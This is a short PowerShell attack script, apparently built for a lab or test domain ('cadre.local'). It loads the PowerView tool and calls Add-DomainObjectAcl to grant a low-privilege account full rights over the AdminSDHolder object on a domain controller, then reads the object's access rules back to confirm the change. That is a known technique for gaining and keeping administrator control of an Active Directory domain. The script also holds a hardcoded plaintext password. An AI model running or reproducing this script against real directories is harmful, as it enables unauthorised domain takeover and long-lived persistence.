$ErrorActionPreference = 'Stop'
$user = 'cadre.local\analyst_cloud'
$pass = 'Cl0ud_An@lyst!'
$asdDn = 'CN=AdminSDHolder,CN=System,DC=cadre,DC=local'

$pv = 'C:\Tools\cadre-attack\PowerView.ps1'
if (-not (Test-Path $pv)) { throw 'PowerView.ps1 not found' }
. $pv

$secpass = ConvertTo-SecureString $pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $secpass)

Add-DomainObjectAcl -TargetIdentity $asdDn -PrincipalIdentity 'cadre.local\analyst_cloud' -Rights All -Server 'dc01.cadre.local' -Credential $cred -Verbose
Write-Output 'POWERVIEW_ADD_OK'

# Verify
$de = New-Object DirectoryServices.DirectoryEntry('LDAP://' + $asdDn, $user, $pass)
$sd = $de.ObjectSecurity
$sid = (New-Object Security.Principal.NTAccount('cadre.local\analyst_cloud')).Translate([Security.Principal.SecurityIdentifier])
$count = 0
foreach ($r in $sd.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier])) {
    $ref = $r.IdentityReference.Value
    try { $refSid = (New-Object Security.Principal.NTAccount($ref)).Translate([Security.Principal.SecurityIdentifier]).Value } catch { $refSid = $ref }
    if ($refSid -eq $sid.Value) {
        $count++
        Write-Output ("MY_ACE " + $r.AccessControlType + " rights=" + $r.ActiveDirectoryRights + " inherit=" + $r.InheritanceType)
    }
}
if ($count -lt 2) { Write-Output ('T025_WARN only ' + $count + ' analyst_cloud ACEs') } else { Write-Output 'T025_VERIFY_OK' }
